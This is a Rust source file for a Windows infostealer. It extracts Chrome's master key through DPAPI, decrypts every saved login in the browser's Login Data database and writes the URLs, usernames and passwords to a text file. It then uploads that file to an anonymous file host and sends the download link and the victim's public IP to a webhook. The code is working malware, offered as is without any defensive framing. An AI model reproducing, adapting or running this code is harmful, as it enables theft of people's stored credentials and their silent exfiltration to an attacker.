use serde_json::Value;
use std::io::Write;
use platform_dirs::AppDirs;
use std::{convert::TryInto, ptr, io::BufReader, io::Read, fs::File, path::PathBuf, fs};
use rusqlite::{Connection, Result};
use winapi::{um::wincrypt::CRYPTOAPI_BLOB, um::dpapi::CryptUnprotectData, shared::minwindef::BYTE};
use aes_gcm::{Aes256Gcm, Error};
use aes_gcm::aead::{Aead, NewAead};
use aes_gcm::aead::generic_array::GenericArray;
use reqwest;
use reqwest::blocking::{Client,multipart};


//debug for resting :)


#[derive(Debug)]
struct Chromepass {
    url: String,
    login: String,
    password: String,
}
impl std::fmt::Display for Chromepass {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}\n{}\n{}", self.url, self.login, self.password)
    }
}
//JUST CHROME VERS
impl Chromepass {

    fn local_app_data_folder(open: &str) -> PathBuf {
        AppDirs::new(Some(open), false).unwrap().data_dir
    }

    fn chrome_saved_key() -> Result<Vec<BYTE>, std::io::Error> {
        let local_state_path = Chromepass::local_app_data_folder("Google\\Chrome\\User Data\\Local State");
        let file = File::open(local_state_path)?;
        
        let mut buf_reader = BufReader::new(file);
        let mut contents = String::new();
        buf_reader.read_to_string(&mut contents)?;
        
        let deserialized_content: Value = serde_json::from_str(contents.as_str())?;
        
        let mut encrypted_key = deserialized_content["os_crypt"]["encrypted_key"].to_string();
        encrypted_key = (&encrypted_key[1..encrypted_key.len() - 1]).parse().unwrap();
    
        let decoded_password = base64::decode(encrypted_key).unwrap();
        let mut password = decoded_password[5..decoded_password.len()].to_vec();
        let bytes: u32 = password.len().try_into().unwrap();
        
        let mut blob = CRYPTOAPI_BLOB { cbData: bytes, pbData: password.as_mut_ptr() };
        let mut new_blob = CRYPTOAPI_BLOB { cbData: 0, pbData: ptr::null_mut() };
        
                    unsafe {
                    CryptUnprotectData(
                    &mut blob,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    0,
                    &mut new_blob,
                    )
                    };
        
        let cb_data = new_blob.cbData.try_into().unwrap();
        
                    let res = unsafe {
                    Vec::from_raw_parts(new_blob.pbData, cb_data, cb_data)
                    };
        
        
        Ok(res)
        }
    
    fn find_db() -> std::io::Result<PathBuf> {
        let local_sqlite_path = Chromepass::local_app_data_folder("Google\\Chrome\\User Data\\Default\\Login Data");
        
        let moved_to = Chromepass::local_app_data_folder("sqlite_file");
        
        let db_file = moved_to.clone();
        
        fs::copy(local_sqlite_path, moved_to)?;
        Ok(db_file)
    }

    fn obtain_data_from_db() -> Result<Vec<Chromepass>> {
        let conn = Connection::open(Chromepass::find_db().unwrap())?;
        //ok load it
        let mut stmt = conn.prepare("SELECT action_url, username_value, password_value from logins")?;
        let chrome_data = stmt.query_map([], |row| {
            Ok(Chromepass {
            url: row.get(0)?,
            login: row.get(1)?,
            password: Chromepass::decrypt_password(row.get(2)?).unwrap(),
            })
            })?;
        
        let mut result = vec![];
        
        for data in chrome_data {
            result.push(data.unwrap());
        }
        
        Ok(result)
    }

    fn decrypt_password(password: Vec<u8>) -> winapi::_core::result::Result<String, Error> {
        let key_buf = Chromepass::chrome_saved_key().unwrap();
        let key = GenericArray::from_slice(key_buf.as_ref());
        let cipher = Aes256Gcm::new(key);
        let nonce = GenericArray::from_slice(&password[3..15]);
        let plaintext = cipher.decrypt(nonce, &password[15..])?;
        
        let decrypted_password = String::from_utf8(plaintext).unwrap();
        
        Ok(decrypted_password)
        }

}

fn anon_upload(fpath: &'static str) -> Result<String, reqwest::Error> {
    let mut file = File::open(fpath).unwrap();
    let mut contents = Vec::new();
    file.read_to_end(&mut contents).unwrap();

    let client = Client::new();
    let form = multipart::Form::new()
        .part("file", multipart::Part::bytes(contents).file_name(fpath));

    let response = client
        .post("https://api.anonfiles.com/upload")
        .multipart(form)
        .send()?;

    let result: serde_json::Value = response.json()?;
    let link = result["data"]["file"]["url"]["short"].as_str().unwrap();

    Ok(link.to_string())
}

//we can use the decryption key later probably
fn main() {
    //gettings IP of tagert just testing :0

    //ok lets load it into a text file 
    let chrome_datap = Chromepass::obtain_data_from_db().unwrap();
    let mut filep = fs::File::create("passwords.txt").unwrap();
    for chrome in chrome_datap {
        let url = if chrome.url.is_empty() { "None".to_owned() } else { chrome.url };
        let login = if chrome.login.is_empty() { "None".to_owned() } else { chrome.login };
        let password = if chrome.password.is_empty() { "None".to_owned() } else { chrome.password };
        if url != "None" || login != "None" || password != "None" {
            let line = format!("\nurl: {}\nusername: {}\npassword: {}\n", url, login, password);
            filep.write_all(line.as_bytes()).unwrap();
        }
    }

    let file_path = "passwords.txt";
    let plink = anon_upload(file_path).unwrap();
    let response = reqwest::blocking::get("https://api.ipify.org").unwrap();
    let ip = response.text().unwrap();
    let ipmessage = format!("Client IP: {}", ip);
    let json_data = format!(r#"{{
        "content": null,
        "embeds": [
            {{
                "description": "```{} ``````Passwords: {}```",
                "color": null,
                "author": {{
                    "name": "Rust Recover"
                }}
            }}
        ],
        "attachments": []
    }}"#, ipmessage,plink);
    

    let client = Client::new();
    let res = client.post("WEBHOOK")
        .body(json_data.to_string())
        .header("Content-Type", "application/json")
        .send()
        .unwrap();

    println!("{:#?}", res);
}
